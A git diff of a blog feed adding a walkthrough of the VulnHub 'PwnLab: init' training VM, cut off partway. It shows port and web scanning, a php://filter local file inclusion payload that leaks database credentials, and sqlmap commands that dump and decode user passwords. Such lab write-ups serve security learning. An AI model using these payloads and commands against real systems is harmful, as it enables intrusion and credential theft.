@@ -4,7 +4,7 @@
   <title><![CDATA[F4l13n5n0w]]></title>
   <link href="http://f4l13n5n0w.github.io/atom.xml" rel="self"/>
   <link href="http://f4l13n5n0w.github.io/"/>
-  <updated>2016-08-17T01:31:18+10:00</updated>
+  <updated>2016-08-29T22:10:45+10:00</updated>
   <id>http://f4l13n5n0w.github.io/</id>
   <author>
     <name><![CDATA[F4l13n5n0w]]></name>
@@ -12,6 +12,1208 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[[VulnHub] PwnLab: init]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init/"/>
+    <updated>2016-08-29T20:46:38+10:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init</id>
+    <content type="html"><![CDATA[<p>&ldquo;Wellcome to \"PwnLab: init\&rdquo;, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/claor,331/">Claor</a></p>
+
+<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">here</a>.</p>
+
+<!-- more -->
+
+
+<h2>Attacker &amp; Target</h2>
+
+<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>
+
+<p>Target: PwnLab: init (<em>10.1.1.140/24</em>)</p>
+
+<h2>Vulnerability &amp; Exploit</h2>
+
+<ul>
+<li>Local File Inclusion vulnerability</li>
+<li>Dump DB tables and crack user credentials</li>
+<li>Login and upload webshell/Reverse PHP Shell</li>
+<li>Bypass File Extension limit</li>
+<li>Exploit <code>setuid</code> sticky bit set file/program to privilege escape</li>
+</ul>
+
+
+<h2>Method</h2>
+
+<ul>
+<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
+<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
+<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
+<li>Local File Inclusion vulnerability found and exploited to discover MySQL login information</li>
+<li>Login to MySQL DB and download user table to obtain user/pass</li>
+<li>Login to Web application as privilege user and upload webshell/PHP reverse shell</li>
+<li>Enumeration after get into the target server and escape to different users</li>
+<li>Exploit <code>setuid</code> stikcy bit set program to get ROOT</li>
+</ul>
+
+
+<h2>Tools</h2>
+
+<p>All the tools used here can be found in Kali Linux</p>
+
+<ul>
+<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
+<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
+<li><a href="https://nmap.org/">nmap</a></li>
+<li><a href="https://cirt.net/Nikto2">nikto</a></li>
+<li><a href="http://sqlmap.org/">sqlmap</a></li>
+<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
+<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
+<li><a href="https://portswigger.net/burp/">burp suite</a></li>
+<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
+</ul>
+
+
+<h2>Walkthrough</h2>
+
+<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
+</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
+</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
+</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
+</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
+</span><span class='line'>10.1.1.140    00:0c:29:11:ce:27   VMware, Inc.
+</span><span class='line'>10.1.1.254    00:50:56:ee:0a:4f   VMware, Inc.
+</span><span class='line'>
+</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.312 seconds <span class="o">(</span>110.73 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>10.1.1.140</code> is our Target!</p>
+
+<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.140/32 --rate<span class="o">=</span>10000
+</span><span class='line'>
+</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-22 13:17:05 GMT
+</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class='line'>Initiating SYN Stealth Scan
+</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
+</span><span class='line'>Discovered open port 111/tcp on 10.1.1.140
+</span><span class='line'>Discovered open port 3306/tcp on 10.1.1.140
+</span><span class='line'>Discovered open port 80/tcp on 10.1.1.140
+</span><span class='line'>Discovered open port 59968/tcp on 10.1.1.140
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
+</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.140
+</span><span class='line'>Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span>.
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
+</span><span class='line'><span class="p">|</span> http-methods:
+</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
+</span><span class='line'><span class="p">|</span>_http-title: PwnLab Intranet Image Hosting
+</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+</span><span class='line'><span class="p">|</span> rpcinfo:
+</span><span class='line'><span class="p">|</span>   program version   port/proto  service
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
+</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35271/udp  status
+</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          59968/tcp  status
+</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
+</span><span class='line'><span class="p">|</span> mysql-info:
+</span><span class='line'><span class="p">|</span>   Protocol: 53
+</span><span class='line'><span class="p">|</span>   Version: .5.47-0+deb8u1
+</span><span class='line'><span class="p">|</span>   Thread ID: 38
+</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
+</span><span class='line'><span class="p">|</span>   Some Capabilities: ODBCClient, LongPassword, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, Support41Auth
+</span><span class='line'><span class="p">|</span>   Status: Autocommit
+</span><span class='line'><span class="p">|</span>_  Salt: <span class="p">&amp;</span>AVi2YKInpe-Lv1.3R<span class="p">&amp;</span>d
+</span><span class='line'>59968/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
+</span><span class='line'>MAC Address: 00:0C:29:11:CE:27 <span class="o">(</span>VMware<span class="o">)</span>
+</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
+</span><span class='line'>Device <span class="nb">type</span>: general purpose
+</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
+</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+</span><span class='line'>OS details: Linux 3.2 - 4.4
+</span><span class='line'>...truncated...
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Based on the result of NMAP scan, firstly, I found port 80 and 3306 is open.</p>
+
+<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
+</span><span class='line'>+ Target Host: 10.1.1.140
+</span><span class='line'>+ Target Port: 80
+</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
+</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span><span class='line'>+ GET IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&quot;127.0.1.1&quot;</span>.
+</span><span class='line'>+ OSVDB-630: GET IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="s2">&quot;http://127.0.1.1/images/&quot;</span>.
+</span><span class='line'>+ SZYEPUYV Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
+</span><span class='line'>+ GET Cookie PHPSESSID created without the httponly flag
+</span><span class='line'>+ GET /config.php: PHP Config file may contain database IDs and passwords.
+</span><span class='line'>+ OSVDB-3268: GET /images/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3268: GET /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
+</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
+</span><span class='line'>+ GET /login.php: Admin login page/section found.
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From the nikto scan, I noticed that <code>/login.php</code> is found which could be the Admin login page, and <code>/images/</code> directory indexing found, and last but not least, <code>/config.php</code> is found which may contain database IDs and passowrds.</p>
+
+<p>Then I use firefox to open the target website and have a look around.</p>
+
+<p>I was hanging on here for quite a while, after trying brute force the login, tring SQL injection and trying brute force directory but all failed&hellip; I finally found a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" title="Local File Inclusion with PHP wrappers">LFI vulnerability</a> on the <code>page</code> parameter.</p>
+
+<p>by exploiting this LFI vulnerability and based on the previous Nickto scan result (<code>config.php</code> is found and may contain DB login):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>config
+</span><span class='line'>&lt;html&gt;
+</span><span class='line'>&lt;head&gt;
+</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
+</span><span class='line'>&lt;/head&gt;
+</span><span class='line'>&lt;body&gt;
+</span><span class='line'>&lt;center&gt;
+</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
+</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
+</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
+</span><span class='line'>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&lt;/center&gt;
+</span><span class='line'>&lt;/body&gt;
+</span><span class='line'>&lt;/html&gt;root@kali:~/myExercises/pwnlab_init#
+</span><span class='line'>root@kali:~/myExercises/pwnlab_init# <span class="nb">echo</span> <span class="s2">&quot;PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&quot;</span> <span class="p">|</span> base64 --decode
+</span><span class='line'>&lt;?php
+</span><span class='line'><span class="nv">$server</span>     <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&quot;root&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;H4u%QJ_H99&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$database</span> <span class="o">=</span> <span class="s2">&quot;Users&quot;</span><span class="p">;</span>
+</span><span class='line'>?&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, now I got the database ROOT login (<font color="red"><code>root/H4u%QJ_H99</code></font>) and the DB name is <font color="red"><code>Users</code></font>, then I use <code>sqlmap</code> to check target DB</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --tables -D Users
+</span><span class='line'>         _
+</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
+</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
+</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
+</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 20:02:54
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;Users&#39;</span>
+</span><span class='line'>Database: Users
+</span><span class='line'><span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
+</span><span class='line'>+-------+
+</span><span class='line'><span class="p">|</span> users <span class="p">|</span>
+</span><span class='line'>+-------+
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 20:02:54
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Got the table name is <code>users</code>, then dump the table:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --dump -T users -D Users
+</span><span class='line'>         _
+</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
+</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
+</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
+</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 20:03:23
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="s1">&#39;users&#39;</span> in database <span class="s1">&#39;Users&#39;</span>
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;user&#39;</span>, u<span class="s1">&#39;varchar(30)&#39;</span><span class="o">]</span>, <span class="o">[</span>u<span class="s1">&#39;pass&#39;</span>, u<span class="s1">&#39;varchar(30)&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching entries <span class="k">for</span> table <span class="s1">&#39;users&#39;</span> in database <span class="s1">&#39;Users&#39;</span>
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> analyzing table dump <span class="k">for</span> possible password hashes
+</span><span class='line'>Database: Users
+</span><span class='line'>Table: users
+</span><span class='line'><span class="o">[</span><span class="m">3</span> entries<span class="o">]</span>
+</span><span class='line'>+------------------+--------+
+</span><span class='line'><span class="p">|</span> pass             <span class="p">|</span> user   <span class="p">|</span>
+</span><span class='line'>+------------------+--------+
+</span><span class='line'><span class="p">|</span> <span class="nv">aVN2NVltMkdSbw</span><span class="o">==</span> <span class="p">|</span> kane   <span class="p">|</span>
+</span><span class='line'><span class="p">|</span> <span class="nv">Sld6WHVCSkpOeQ</span><span class="o">==</span> <span class="p">|</span> kent   <span class="p">|</span>
+</span><span class='line'><span class="p">|</span> <span class="nv">U0lmZHNURW42SQ</span><span class="o">==</span> <span class="p">|</span> mike   <span class="p">|</span>
+</span><span class='line'>+------------------+--------+
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> table <span class="s1">&#39;Users.users&#39;</span> dumped to CSV file <span class="s1">&#39;/root/.sqlmap/output/10.1.1.140/dump/Users/users.csv&#39;</span>
+</span><span class='line'><span class="o">[</span>20:03:24<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 20:03:24
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, here we go, got the username and password (base64 encoded), and the user/pass are:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane / iSv5Ym2GRo
+</span><span class='line'>kent / JWzXuBJJNy
+</span><span class='line'>mike / SIfdsTEn6I
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I also checked if I can write file via MySQL, but sounds like we don&rsquo;t have enough privilege.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --current-user --is-dba
+</span><span class='line'>         _
+</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
+</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
+</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
+</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 22:37:40
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
+</span><span class='line'><span class="o">[</span>22:37:40<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
